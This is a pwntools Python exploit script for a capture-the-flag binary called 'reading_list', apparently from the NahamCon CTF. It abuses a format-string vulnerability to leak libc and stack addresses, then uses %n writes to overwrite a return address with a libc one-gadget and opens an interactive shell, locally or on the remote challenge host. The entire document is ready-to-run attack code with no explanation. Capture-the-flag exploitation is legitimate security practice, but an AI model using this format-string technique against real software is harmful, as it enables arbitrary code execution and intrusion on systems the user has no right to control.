#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./reading_list', checksec=False)

if args.REMOTE:
	libc = ELF('libc-2.31.so', checksec=False)
	libc.symbols['gadget'] = 0xe3b31
	libc_start_main_offset = 243
	p = remote('challenge.nahamcon.com', 30933)
else:
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
	libc.symbols['gadget'] = 0xe3b31
	libc_start_main_offset = 243
	p = process(binary.path)

p.sendlineafter(b'name: ', b'foo')
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'name: ', b'%23$018p %7$018p')
p.sendlineafter(b'> ', b'1')
p.recvuntil(b'1. ')
_ = p.recvline().strip().decode().split()
libc.address = int(_[0],16) - libc.sym.__libc_start_main - libc_start_main_offset
rsp = int(_[1],16) - 0x40
ret = rsp + 0x28

log.info('libc.address: {x}'.format(x = hex(libc.address)))
log.info('libc.sym.gadget: {x}'.format(x = hex(libc.sym.gadget)))
log.info('rsp: {x}'.format(x = hex(rsp)))
log.info('ret: {x}'.format(x = hex(ret)))

payload = b''
for i in range(3): payload += p64(ret + i*2)

p.sendlineafter(b'> ', b'4')
p.sendlineafter(b'name: ', payload)

payload = b''
offset = 14
for i in range(3):
	payload = b'%' + str((libc.sym.gadget >> i*16) & 0xFFFF).encode() + b'c%' + str(offset + i).encode() + b'$n'
	p.sendlineafter(b'> ', b'2')
	p.sendlineafter(b'name: ', payload)

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'name: ', b'bookend')
p.sendlineafter(b'> ', b'1')
p.recvuntil(b'bookend\n')
p.interactive()

